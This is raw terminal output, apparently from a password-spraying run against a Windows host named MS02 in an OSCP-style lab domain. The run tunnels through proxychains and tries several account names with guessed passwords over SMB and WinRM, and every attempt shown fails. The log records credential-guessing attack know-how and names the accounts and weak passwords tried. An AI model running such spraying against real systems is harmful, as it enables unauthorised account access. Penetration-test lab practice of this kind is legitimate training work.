[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Guest:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\DefaultAccount:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\WDAGUtilityAccount:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Mary.Williams:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\support:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\cloudbase-init:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Admin:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\web_svc:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\sql_svc:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Administrator:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Guest:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\DefaultAccount:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\WDAGUtilityAccount:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Mary.Williams:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\support:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\cloudbase-init:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Admin:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\web_svc:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\sql_svc:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Administrator:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Guest:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\DefaultAccount:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\WDAGUtilityAccount:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Mary.Williams:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\support:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\cloudbase-init:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Admin:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\web_svc:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\sql_svc:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Administrator:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Guest:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\DefaultAccount:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\WDAGUtilityAccount:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Mary.Williams:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\support:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\cloudbase-init:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Admin:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\web_svc:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\sql_svc:Dolphin1 STATUS_LOGON_FAILURE 

[*] Testing winrm ...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam) 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Administrator:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Guest:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\DefaultAccount:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\WDAGUtilityAccount:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Mary.Williams:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\support:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\cloudbase-init:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Admin:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\web_svc:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\sql_svc:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Administrator:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Guest:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\DefaultAccount:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\WDAGUtilityAccount:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Mary.Williams:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\support:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\cloudbase-init:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Admin:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\web_svc:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\sql_svc:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Administrator:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Guest:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\DefaultAccount:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\WDAGUtilityAccount:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Mary.Williams:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\support:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\cloudbase-init:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Admin:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\web_svc:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\sql_svc:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Administrator:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Guest:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\DefaultAccount:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\WDAGUtilityAccount:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Mary.Williams:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\support:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\cloudbase-init:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\Admin:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\web_svc:Dolphin1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] oscp.exam\sql_svc:Dolphin1

[*] Testing winrm (local-auth)...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam) 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Administrator:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Guest:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\DefaultAccount:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\WDAGUtilityAccount:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Mary.Williams:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\support:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\cloudbase-init:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Admin:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\web_svc:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\sql_svc:December31
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Administrator:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Guest:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\DefaultAccount:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\WDAGUtilityAccount:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Mary.Williams:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\support:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\cloudbase-init:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Admin:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\web_svc:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\sql_svc:Freedom1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Administrator:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\Guest:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\DefaultAccount:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
WINRM       10.10.135.148   5985   MS02             [-] MS02\WDAGUtilityAccount:Diamond1
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:5985  ...  OK
